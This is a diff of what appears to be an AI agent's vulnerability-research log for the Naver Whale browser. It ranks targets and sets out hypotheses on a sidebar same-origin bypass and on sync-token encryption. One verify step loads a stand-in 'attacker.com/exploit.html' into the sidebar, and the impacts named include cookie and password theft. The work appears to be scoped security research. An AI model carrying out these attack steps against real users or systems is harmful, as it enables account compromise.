@@ -1,16 +1,7 @@
-## 2026-08-08 19:26:56 UTC [browser] (model nemotron3)
-[PRIO] whalesync client engine (api.whale.naver.com/whalesync + profile prefs), 6.55, atk=7 biz=8 tech=9 gate=2 cloud=3 fresh=8
+## 2026-08-08 19:58:00 UTC [browser] (model nemotron3)
 [PRIO] Whale v4.38.386.14 desktop Linux sidebar (sidebarAction.show + ALL-origin content_scripts + background.js no origin check), 6.40, atk=8 biz=8 tech=8 gate=2 cloud=3 fresh=10
+[PRIO] whalesync client engine (api.whale.naver.com/whalesync + profile prefs), 6.55, atk=7 biz=8 tech=9 gate=2 cloud=3 fresh=8
 [PRIO] com.naver.whale Android 3.9.14.9 sync engine (api.whale.naver.com/whalesync), 6.15, atk=6 biz=8 tech=7 gate=3 cloud=4 fresh=7
-[HYP] Sync bootstrap-token envelope storage — Whale OSCrypt deviation on Linux
-class: AUTH
-asset: whalesync client engine (api.whale.naver.com/whalesync) + profile prefs sync.encryption_bootstrap_token_per_account sha256=053ffa4b...
-confidence: 62
-reasoning: v4.38.386.14 binary confirms Whale-only prefs keys (sync.encryption_bootstrap_token_per_account, _migration_done, whale_need_encryption_key_forced_time) + Whale-forked OSCrypt (os_crypt_whale.cc, wbc_wrapper_apis.cc, xv10 magic); /whalesync authed by NEO_SES cookie only; sync.cookies/sync.passwords in type list; per-account bootstrap token envelope deviates from upstream Chromium sync.encryption_bootstrap_token
-evidence_needed: Per-account token plaintext vs Whale-OSCrypt-v10 in Preferences; where os_crypt_whale stores master key on Linux; whether whale_need_encryption_key_forced_time downgrades to stale key
-verify_steps: PASSIVE: objdump/strings on os_crypt_whale + whale_sync_util call sites for bootstrap-token envelope and /whalesync/reset request shape (method/body/auth headers); diff pref set vs upstream Chromium; zero network
-impact: Local attacker/infostealer with profile access decrypts synced passwords/cookies/autofill → full-account compromise (High)
-testability: PASSIVE
 [HYP] Sidebar SOP bypass via unvalidated origin in sidebarAction message handler (CVE-2025-69235 variant)
 class: OTHER
 asset: Whale v4.38.386.14 desktop Linux sidebar (sidebarAction.show({url})) + dual-tab web panel
@@ -20,6 +11,15 @@ evidence_needed: Script execution or cross-origin fetch in sidebar/dual-tab pane
 verify_steps: HUMAN_ONLY: Install Whale v4.38.386.14 on Linux → load sidebar-sample extension → whale.sidebarAction.show({url:'https://attacker.com/exploit.html'}) → attempt cross-origin fetch from panel content script → test drag-drop with use_navigation_bar:false → check opener/parent readback. Zero requests to Naver infra.
 impact: SOP bypass / script execution in privileged browser-UI context — cross-origin cookie/DOM/CSRF-token theft; Critical if escalates to renderer code execution
 testability: HUMAN_ONLY
+[HYP] Sync bootstrap-token envelope storage — Whale OSCrypt deviation on Linux
+class: AUTH
+asset: whalesync client engine (api.whale.naver.com/whalesync) + profile prefs sync.encryption_bootstrap_token_per_account sha256=053ffa4b...
+confidence: 62
+reasoning: v4.38.386.14 binary confirms Whale-only prefs keys (sync.encryption_bootstrap_token_per_account, _migration_done, whale_need_encryption_key_forced_time) + Whale-forked OSCrypt (os_crypt_whale.cc, wbc_wrapper_apis.cc, xv10 magic); /whalesync authed by NEO_SES cookie only; sync.cookies/sync.passwords in type list; per-account bootstrap token envelope deviates from upstream Chromium sync.encryption_bootstrap_token
+evidence_needed: Per-account token plaintext vs Whale-OSCrypt-v10 in Preferences; where os_crypt_whale stores master key on Linux; whether whale_need_encryption_key_forced_time downgrades to stale key
+verify_steps: PASSIVE: objdump/strings on os_crypt_whale + whale_sync_util call sites for bootstrap-token envelope and /whalesync/reset request shape (method/body/auth headers); diff pref set vs upstream Chromium; zero network. Requires binary.
+impact: Local attacker/infostealer with profile access decrypts synced passwords/cookies/autofill → full-account compromise (High)
+testability: PASSIVE
 [HYP] Android sync encryption key derivation/storage — com.naver.whale 3.9.14.9
 class: AUTH
 asset: com.naver.whale 3.9.14.9 sync engine (api.whale.naver.com/whalesync)
